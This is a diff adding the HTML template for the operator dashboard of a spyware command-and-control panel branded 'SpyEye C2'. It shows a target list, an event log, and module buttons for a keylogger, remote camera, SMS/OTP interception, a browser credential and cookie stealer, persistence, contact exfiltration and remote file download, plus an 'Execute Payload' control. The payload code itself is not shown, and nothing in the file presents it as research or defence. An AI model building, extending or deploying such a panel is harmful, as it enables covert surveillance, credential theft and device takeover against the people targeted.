@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ framework }} - Advanced C2 Master Operations Center (v{{ version }})</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body class="matrix-theme">
+    <!-- Top Command Header Bar -->
+    <header class="top-bar">
+        <div class="logo-area">
+            <div class="eye-container">
+                <img src="{{ url_for('static', filename='images/eye_icon.gif') }}" alt="SpyEye Core Logo" class="animated-eye-img" onerror="this.style.display='none'; document.getElementById('fallback-eye').style.display='inline-block';">
+                <span id="fallback-eye" class="animated-eye" style="display:none;"><i class="fa-solid fa-eye"></i></span>
+            </div>
+            <div class="title-wrapper">
+                <h1 class="glitch-text" data-text="{{ framework }}">{{ framework }}</h1>
+                <span class="version-badge">SECURE C2 v{{ version }}</span>
+            </div>
+        </div>
+        <div class="system-telemetry-status">
+            <div class="metric-pill"><i class="fa-solid fa-server"></i> <span id="server-status-text">ONLINE</span></div>
+            <div class="metric-pill"><i class="fa-solid fa-network-wired"></i> <span id="active-targets-count">1 Active</span></div>
+            <span class="status-indicator online"></span>
+        </div>
+    </header>
+
+    <!-- Main Workspace Layout -->
+    <div class="main-container">
+        <!-- Target Management Sidebar -->
+        <aside class="sidebar panel">
+            <div class="panel-header">
+                <h3><i class="fa-solid fa-bullseye"></i> ACTIVE TARGETS</h3>
+                <span class="badge-counter" id="target-counter">1</span>
+            </div>
+            <div class="search-box">
+                <input type="text" id="target-search" placeholder="Filter targets..." onkeyup="filterTargets()">
+            </div>
+            <div id="target-list" class="target-list">
+                <div class="target-item active" data-targetid="target_default_01" onclick="selectTarget('target_default_01', this)">
+                    <div class="target-icon-wrap"><i class="fa-solid fa-laptop-code"></i></div>
+                    <div class="target-info">
+                        <span class="target-name">Default Workstation</span>
+                        <span class="target-id">target_default_01</span>
+                        <span class="target-meta"><i class="fa-solid fa-signal"></i> Connected</span>
+                    </div>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Central Command & Operations Workspace -->
+        <main class="workspace">
+            <!-- Advanced Module Orchestration Grid -->
+            <section class="control-panel panel">
+                <div class="panel-header">
+                    <h3><i class="fa-solid fa-microchip"></i> MODULE ORCHESTRATION & EXECUTION MATRIX</h3>
+                    <span class="info-tooltip" title="Dispatch real-time payload modules to selected target context">PRO-EDITION</span>
+                </div>
+                <div class="module-grid">
+                    <button class="mod-btn" onclick="openModuleConfig('keylogger')">
+                        <i class="fa-solid fa-keyboard"></i>
+                        <span class="mod-title">Keylogger</span>
+                        <span class="mod-desc">Capture keystrokes & inputs</span>
+                    </button>
+                    <button class="mod-btn" onclick="openModuleConfig('camera')">
+                        <i class="fa-solid fa-camera"></i>
+                        <span class="mod-title">Remote Camera</span>
+                        <span class="mod-desc">Stream live feed / snapshots</span>
+                    </button>
+                    <button class="mod-btn" onclick="openModuleConfig('ussd')">
+                        <i class="fa-solid fa-mobile-screen-button"></i>
+                        <span class="mod-title">USSD Executor</span>
+                        <span class="mod-desc">Interactive mobile dialogue</span>
+                    </button>
+                    <button class="mod-btn" onclick="openModuleConfig('persistence')">
+                        <i class="fa-solid fa-rotate"></i>
+                        <span class="mod-title">Persistence</span>
+                        <span class="mod-desc">Autostart & boot vectors</span>
+                    </button>
+                    <button class="mod-btn" onclick="openModuleConfig('sms_interceptor')">
+                        <i class="fa-solid fa-envelope-open-text"></i>
+                        <span class="mod-title">SMS / OTP Intercept</span>
+                        <span class="mod-desc">Filter Telegram / auth tokens</span>
+                    </button>
+                    <button class="mod-btn" onclick="openModuleConfig('device_info')">
+                        <i class="fa-solid fa-fingerprint"></i>
+                        <span class="mod-title">Device Info</span>
+                        <span class="mod-desc">OS, hardware & network footprint</span>
+                    </button>
+                    <button class="mod-btn" onclick="openModuleConfig('browser_stealer')">
+                        <i class="fa-solid fa-globe"></i>
+                        <span class="mod-title">Browser Stealer</span>
+                        <span class="mod-desc">Extract credentials & cookies</span>
+                    </button>
+                    <button class="mod-btn" onclick="openModuleConfig('call_contacts')">
+                        <i class="fa-solid fa-address-book"></i>
+                        <span class="mod-title">Call & Contacts</span>
+                        <span class="mod-desc">Exfiltrate logs & address book</span>
+                    </button>
+                    <button class="mod-btn" onclick="openModuleConfig('file_manager')">
+                        <i class="fa-solid fa-folder-tree"></i>
+                        <span class="mod-title">File Manager</span>
+                        <span class="mod-desc">Browse & download target files</span>
+                    </button>
+                </div>
+            </section>
+
+            <!-- Dynamic Telemetry / Interactive Console Panel -->
+            <section class="terminal-panel panel">
+                <div class="terminal-header">
+                    <div class="terminal-title-group">
+                        <i class="fa-solid fa-terminal"></i>
+                        <span>LIVE TELEMETRY & EVENT STREAM</span>
+                        <span class="live-indicator-dot"></span>
+                    </div>
+                    <div class="terminal-actions">
+                        <button class="term-action-btn" onclick="toggleAutoScroll()" id="autoscroll-toggle" title="Toggle Auto-Scroll"><i class="fa-solid fa-lock"></i> Auto</button>
+                        <button class="term-action-btn" onclick="exportTerminalLogs()" title="Export Logs"><i class="fa-solid fa-download"></i> Export</button>
+                        <button class="term-action-btn clear-btn" onclick="clearTerminal()"><i class="fa-solid fa-trash-can"></i> Clear</button>
+                    </div>
+                </div>
+                <div id="terminal-output" class="terminal-body">
+                    <div class="log-entry info"><span class="log-time">[10:14:22]</span> <span class="log-prefix">[INIT]</span> SpyEye C2 Master Controller successfully bound to secure socket layer.</div>
+                    <div class="log-entry success"><span class="log-time">[10:14:23]</span> <span class="log-prefix">[CORE]</span> Module registry loaded: 9 executive handlers initialized in memory.</div>
+                    <div class="log-entry"><span class="log-time">[10:14:25]</span> <span class="log-prefix">[STATUS]</span> Awaiting incoming agent heartbeats and target telemetry streams...</div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Professional Interactive Module Configuration & Execution Modal -->
+    <div id="module-modal" class="modal-overlay" style="display: none;">
+        <div class="modal-container panel">
+            <div class="modal-header">
+                <h3 id="modal-title"><i class="fa-solid fa-sliders"></i> Configure Module</h3>
+                <button class="modal-close-btn" onclick="closeModuleModal()"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div class="modal-body" id="modal-body-content">
+                <!-- Dynamic form fields injected via script.js -->
+            </div>
+            <div class="modal-footer">
+                <button class="mod-btn modal-cancel-btn" onclick="closeModuleModal()">Cancel</button>
+                <button class="mod-btn modal-execute-btn" id="modal-execute-action" onclick="executeConfiguredModule()">Execute Payload</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/script.js') }}"></script>
+</body>
+</html>
